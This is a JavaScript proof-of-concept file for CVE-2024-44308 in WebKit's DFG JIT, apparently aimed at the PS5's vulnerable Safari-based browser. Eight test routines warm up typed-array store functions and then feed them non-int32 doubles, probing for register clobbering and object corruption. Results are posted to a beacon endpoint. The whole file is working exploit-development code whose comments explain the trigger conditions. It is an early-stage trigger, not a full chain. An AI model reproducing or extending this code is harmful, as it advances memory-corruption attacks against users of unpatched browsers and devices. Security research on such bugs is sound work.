// p108-44308v3.js — CVE-2024-44308 with CORRECT slow-path trigger
// Key insight from Exodus Intelligence analysis:
// - Bug is in DFG compilePutByValForIntTypedArray
// - Uint32Array on ResizableArrayBuffer
// - Value must be double that CANNOT truncate to int32 (forces slow path)
// - Slow path branch emitted BEFORE scratch2 allocation
// - Live register never spilled → clobbered by C++ call → stale register
// - Affected: Safari < 18.1.1 (PS5 has 17.2.x = VULNERABLE)
//
// Previous p101 MISTAKE: used values that truncate to int32 fine → fast path → no bug

const B = (tag, msg) => {
    try { fetch('/beacon/V108L-' + tag, { method:'POST', body: String(msg) }); } catch(e){}
};

const sleep = ms => new Promise(r => setTimeout(r, ms));

// Helper: detect if a value is an object vs primitive
function isObj(v) {
    return (typeof v === 'object' && v !== null) || typeof v === 'function';
}

// ============================================================
// K1: Basic slow-path trigger detection
// Store double > int32 max into Uint32Array on RAB
// ============================================================
async function testK1() {
    const tag = 'K1';
    try {
        const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
        const u32 = new Uint32Array(rab);
        const marker = { x: 0x41414141, y: 0x42424242, z: 0x43434343 };

        // This function should trigger the bug:
        // - marker is a live object in some register
        // - u32[idx] = val forces slow path when val > 0x7FFFFFFF
        // - After slow path, marker's register may be clobbered
        function hotPut(arr, idx, val, obj) {
            let a = obj.x;
            let b = obj.y;
            arr[idx] = val;
            let c = obj.z;
            return (a + b + c) | 0;
        }
        // Prevent inlining
        function hotPut2(arr, idx, val, obj) {
            try { } catch(e) { }
            let a = obj.x;
            let b = obj.y;
            arr[idx] = val;
            let c = obj.z;
            return (a + b + c) | 0;
        }

        const expected = (0x41414141 + 0x42424242 + 0x43434343) | 0;

        // Phase 1: Warm up with FAST PATH values (int32-safe)
        for (let i = 0; i < 50000; i++) {
            let r = hotPut(u32, i % 64, i & 0x7FFFFFFF, marker);
            if (r !== expected) {
                B(tag, 'WARMUP_WRONG:i=' + i + ',got=' + r + ',exp=' + expected);
                return;
            }
        }
        B(tag, 'WARMUP_OK_50K');

        // Phase 2: Trigger SLOW PATH with values > int32 max
        const slowVals = [
            2147483648.0,    // 0x80000000 — just above int32 max
            4294967295.0,    // 0xFFFFFFFF
            3000000000.0,    // ~0xB2D05E00
            NaN,
            Infinity,
            -Infinity,
            -1.5,            // Negative float
            2147483647.5,    // Just above int32 max as float
        ];

        let anomalies = 0;
        for (let s = 0; s < slowVals.length; s++) {
            for (let rep = 0; rep < 100; rep++) {
                let r = hotPut(u32, (s * 100 + rep) % 64, slowVals[s], marker);
                if (r !== expected) {
                    anomalies++;
                    B(tag, 'SLOW_ANOMALY:val=' + slowVals[s] + ',rep=' + rep +
                        ',got=' + r + ',exp=' + expected);
                    if (anomalies >= 5) {
                        B(tag, 'MULTIPLE_ANOMALIES:' + anomalies);
                        return;
                    }
                }
            }
        }

        B(tag, 'DONE:anomalies=' + anomalies);
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K2: Maximum register pressure variant
// More live values → higher chance the right register gets clobbered
// ============================================================
async function testK2() {
    const tag = 'K2';
    try {
        const rab = new ArrayBuffer(512, { maxByteLength: 2048 });
        const u32 = new Uint32Array(rab);

        const obj1 = { a: 1.1, b: 2.2, c: 3.3 };
        const obj2 = { d: 4.4, e: 5.5, f: 6.6 };
        const obj3 = { g: 7.7, h: 8.8, i: 9.9 };

        // Many live values = heavy register pressure
        function heavyPut(arr, idx, val, o1, o2, o3) {
            let v1 = o1.a;
            let v2 = o1.b;
            let v3 = o2.d;
            let v4 = o2.e;
            let v5 = o3.g;
            let v6 = o3.h;
            arr[idx] = val;  // Slow path trigger
            let v7 = o1.c;
            let v8 = o2.f;
            let v9 = o3.i;
            return v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9;
        }

        const expected = 1.1 + 2.2 + 4.4 + 5.5 + 7.7 + 8.8 + 3.3 + 6.6 + 9.9;

        // Warmup with safe values
        for (let i = 0; i < 50000; i++) {
            heavyPut(u32, i % 128, i & 0x7FFF, obj1, obj2, obj3);
        }

        // Trigger with slow-path values
        let anomalies = 0;
        for (let trial = 0; trial < 500; trial++) {
            let r = heavyPut(u32, trial % 128, 4294967295.0, obj1, obj2, obj3);
            if (Math.abs(r - expected) > 0.001) {
                anomalies++;
                B(tag, 'ANOMALY:trial=' + trial + ',got=' + r + ',exp=' + expected);
                if (anomalies >= 3) break;
            }
        }

        B(tag, 'DONE:anomalies=' + anomalies);
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K3: Property write after slow path (butterfly corruption check)
// If stale register is used for property store → write to wrong memory
// ============================================================
async function testK3() {
    const tag = 'K3';
    try {
        const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
        const u32 = new Uint32Array(rab);

        // Victim object — check if properties get corrupted
        const victim = { p: 0xDEAD, q: 0xBEEF, r: 0xCAFE };
        // Canary object placed after victim in memory
        const canary = { s: 0x1111, t: 0x2222, u: 0x3333 };

        function putThenWrite(arr, idx, val, vict, can) {
            let saved_p = vict.p;
            let saved_s = can.s;
            arr[idx] = val;  // Slow path
            vict.r = 0x9999; // Write using potentially stale register
            return { vp: vict.p, vq: vict.q, vr: vict.r,
                     cs: can.s, ct: can.t, cu: can.u,
                     sp: saved_p, ss: saved_s };
        }

        // Warmup
        for (let i = 0; i < 50000; i++) {
            putThenWrite(u32, i % 64, i & 0x7FFF, victim, canary);
        }
        // Reset
        victim.p = 0xDEAD; victim.q = 0xBEEF; victim.r = 0xCAFE;
        canary.s = 0x1111; canary.t = 0x2222; canary.u = 0x3333;

        // Trigger
        let anomalies = [];
        for (let trial = 0; trial < 200; trial++) {
            let res = putThenWrite(u32, trial % 64, 3000000000.0, victim, canary);

            // Check victim
            if (res.vr !== 0x9999) {
                anomalies.push('vict.r:' + res.vr);
            }
            if (res.vp !== 0xDEAD) {
                anomalies.push('vict.p:' + res.vp);
            }
            // Check canary (butterfly corruption)
            if (res.cs !== 0x1111 || res.ct !== 0x2222 || res.cu !== 0x3333) {
                anomalies.push('CANARY:s=' + res.cs + ',t=' + res.ct + ',u=' + res.cu);
            }
            if (anomalies.length >= 3) break;

            // Reset for next iteration
            victim.p = 0xDEAD; victim.q = 0xBEEF; victim.r = 0xCAFE;
            canary.s = 0x1111; canary.t = 0x2222; canary.u = 0x3333;
        }

        B(tag, 'DONE:anomalies=' + anomalies.length +
            (anomalies.length > 0 ? ':' + anomalies.join('|') : ''));
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K4: Different typed array types to find the right compilation path
// The bug is in compilePutByValForIntTypedArray — any int typed array
// ============================================================
async function testK4() {
    const tag = 'K4';
    try {
        const types = [
            { name: 'Uint32', Ctor: Uint32Array },
            { name: 'Int32', Ctor: Int32Array },
            { name: 'Uint16', Ctor: Uint16Array },
            { name: 'Int16', Ctor: Int16Array },
            { name: 'Uint8', Ctor: Uint8Array },
            { name: 'Int8', Ctor: Int8Array },
        ];

        let results = [];

        for (let t = 0; t < types.length; t++) {
            const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
            const arr = new types[t].Ctor(rab);
            const obj = { x: 111, y: 222, z: 333 };
            const expected = 111 + 222 + 333;

            // Each needs its own function to get separate DFG compilation
            const fn = new Function('arr', 'idx', 'val', 'obj', `
                let a = obj.x;
                let b = obj.y;
                arr[idx] = val;
                let c = obj.z;
                return (a + b + c) | 0;
            `);

            // Warmup
            for (let i = 0; i < 50000; i++) {
                fn(arr, i % (arr.length - 1), i % 127, obj);
            }

            // Trigger with slow-path values
            let found = false;
            const slowVals = [2147483648.0, 4294967295.0, NaN, -1.5, Infinity];
            for (let s = 0; s < slowVals.length && !found; s++) {
                for (let rep = 0; rep < 100 && !found; rep++) {
                    let r = fn(arr, rep % (arr.length - 1), slowVals[s], obj);
                    if (r !== expected) {
                        results.push(types[t].name + ':val=' + slowVals[s] + ':got=' + r);
                        found = true;
                    }
                }
            }
            if (!found) results.push(types[t].name + ':OK');
        }

        B(tag, results.join(','));
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K5: Exact Exodus pattern — object use AFTER putByVal
// Focus on obj being in $rcx (4th arg position in System V ABI)
// ============================================================
async function testK5() {
    const tag = 'K5';
    try {
        const rab = new ArrayBuffer(1024, { maxByteLength: 4096 });
        const u32 = new Uint32Array(rab);

        // t4 pattern: the 4th operand that maps to $rcx
        function exodusPattern(a, b, c, obj) {
            // a=arr, b=idx, c=val, obj=4th param ($rcx in SysV ABI)
            let saved = obj.witness;
            a[b] = c;         // PutByVal — slow path if c > int32 max
            let check = obj.witness;  // Access obj AFTER — uses potentially stale $rcx
            return { before: saved, after: check, same: saved === check };
        }

        const witness = { witness: 0xBAADF00D };

        // Warmup with safe values
        for (let i = 0; i < 60000; i++) {
            exodusPattern(u32, i % 256, i & 0x7FFFFFFF, witness);
        }

        // Trigger
        let anomalies = 0;
        for (let trial = 0; trial < 1000; trial++) {
            let r = exodusPattern(u32, trial % 256, 4294967295.0, witness);
            if (!r.same || r.after !== 0xBAADF00D) {
                anomalies++;
                B(tag, 'HIT:trial=' + trial +
                    ',before=' + r.before + ',after=' + r.after + ',same=' + r.same);
                if (anomalies >= 5) break;
            }
        }

        B(tag, 'DONE:anomalies=' + anomalies);
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K6: Spray + detect variant
// Fill stack frames with known pattern, then check if stale value leaks
// ============================================================
async function testK6() {
    const tag = 'K6';
    try {
        const rab = new ArrayBuffer(256, { maxByteLength: 1024 });
        const u32 = new Uint32Array(rab);

        // Spray markers onto the stack
        function sprayStack(depth) {
            if (depth <= 0) return 0x13371337;
            return sprayStack(depth - 1) + 1;
        }

        // The actual trigger after stack spray
        function afterSpray(arr, idx, val, obj) {
            let x = obj.a;
            arr[idx] = val;
            let y = obj.a;
            return { x: x, y: y, match: x === y };
        }

        const probe = { a: 42.42 };

        // Warmup
        for (let i = 0; i < 50000; i++) {
            afterSpray(u32, i % 64, i & 0x7FFF, probe);
        }

        // Spray then trigger
        let anomalies = 0;
        for (let trial = 0; trial < 500; trial++) {
            sprayStack(50);
            let r = afterSpray(u32, trial % 64, 0xFFFFFFFF, probe);
            if (!r.match) {
                anomalies++;
                B(tag, 'MISMATCH:trial=' + trial + ',x=' + r.x + ',y=' + r.y);
                if (anomalies >= 3) break;
            }
        }

        B(tag, 'DONE:anomalies=' + anomalies);
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K7: Non-resizable ArrayBuffer variant
// Test if the bug also fires on fixed-size ArrayBuffer
// ============================================================
async function testK7() {
    const tag = 'K7';
    try {
        // Fixed-size (NOT resizable) Uint32Array
        const ab = new ArrayBuffer(1024);
        const u32 = new Uint32Array(ab);
        const obj = { w: 7777 };

        function fixedPut(arr, idx, val, o) {
            let before = o.w;
            arr[idx] = val;
            let after = o.w;
            return { b: before, a: after, ok: before === after };
        }

        // Warmup
        for (let i = 0; i < 50000; i++) {
            fixedPut(u32, i % 256, i & 0x7FFFFFFF, obj);
        }

        // Trigger
        let anomalies = 0;
        for (let trial = 0; trial < 1000; trial++) {
            let r = fixedPut(u32, trial % 256, 4294967295.0, obj);
            if (!r.ok) {
                anomalies++;
                B(tag, 'HIT:trial=' + trial + ',b=' + r.b + ',a=' + r.a);
                if (anomalies >= 5) break;
            }
        }

        B(tag, 'DONE:anomalies=' + anomalies + ':FIXED_AB');
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// K8: Massive register pressure with interleaved operations
// Force DFG to use every register, maximizing spill chance
// ============================================================
async function testK8() {
    const tag = 'K8';
    try {
        const rab = new ArrayBuffer(512, { maxByteLength: 2048 });
        const u32 = new Uint32Array(rab);

        const o1 = { a:1, b:2 };
        const o2 = { c:3, d:4 };
        const o3 = { e:5, f:6 };
        const o4 = { g:7, h:8 };

        function megaPressure(arr, idx, val, p1, p2, p3, p4) {
            let r1 = p1.a; let r2 = p1.b;
            let r3 = p2.c; let r4 = p2.d;
            let r5 = p3.e; let r6 = p3.f;
            let r7 = p4.g; let r8 = p4.h;
            arr[idx] = val;
            let s1 = p1.a; let s2 = p1.b;
            let s3 = p2.c; let s4 = p2.d;
            let s5 = p3.e; let s6 = p3.f;
            let s7 = p4.g; let s8 = p4.h;
            let ok = (r1===s1) && (r2===s2) && (r3===s3) && (r4===s4) &&
                     (r5===s5) && (r6===s6) && (r7===s7) && (r8===s8);
            return { ok: ok,
                     sum_before: r1+r2+r3+r4+r5+r6+r7+r8,
                     sum_after: s1+s2+s3+s4+s5+s6+s7+s8 };
        }

        // Warmup
        for (let i = 0; i < 50000; i++) {
            megaPressure(u32, i % 128, i & 0x7FFF, o1, o2, o3, o4);
        }

        // Trigger
        let anomalies = 0;
        const trigVals = [0x80000000, 0xFFFFFFFF, NaN, Infinity, -Infinity, 3e9, -2e9, 2147483647.5];
        for (let v = 0; v < trigVals.length; v++) {
            for (let rep = 0; rep < 200; rep++) {
                let r = megaPressure(u32, rep % 128, trigVals[v], o1, o2, o3, o4);
                if (!r.ok) {
                    anomalies++;
                    B(tag, 'PRESSURE_HIT:val=' + trigVals[v] + ',rep=' + rep +
                        ',before=' + r.sum_before + ',after=' + r.sum_after);
                    if (anomalies >= 3) break;
                }
            }
            if (anomalies >= 3) break;
        }

        B(tag, 'DONE:anomalies=' + anomalies);
    } catch(e) {
        B(tag, 'ERR:' + e.message);
    }
}

// ============================================================
// Run all tests
// ============================================================
async function runAll() {
    B('START', navigator.userAgent);
    await testK1(); await sleep(50);
    await testK2(); await sleep(50);
    await testK3(); await sleep(50);
    await testK4(); await sleep(50);
    await testK5(); await sleep(50);
    await testK6(); await sleep(50);
    await testK7(); await sleep(50);
    await testK8(); await sleep(50);
    B('ALL_DONE', '8_tests_complete');
}

runAll();
